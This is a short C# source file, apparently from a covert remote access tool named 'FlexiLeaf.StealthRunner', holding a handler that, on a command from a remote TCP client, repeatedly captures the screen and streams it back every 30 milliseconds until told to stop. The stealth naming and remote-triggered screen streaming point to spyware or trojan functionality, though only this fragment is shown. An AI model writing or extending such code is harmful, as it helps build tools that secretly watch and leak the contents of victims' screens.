using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FlexiLeaf.StealthRunner.Handlers
{
    internal class ScreenHandlers
    {
        static bool SendUpdateScreen = false;

        [PacketHandler]
        public static void ShowScreen(ScreenPacket packet, TcpClient Client)
        {
            SendUpdateScreen = packet.ShowScreen;
            if (packet.ShowScreen == true)
            {
                ShowScreen(Client);
            }
        }
        private static void ShowScreen(TcpClient Client)
        {
            Task.Run(async () =>
            {
                while (SendUpdateScreen)
                {
                    await Client.Send(ScreenPacket.TakeScreen());
                    await Task.Delay(30);
                }
            });
        }

    }
}
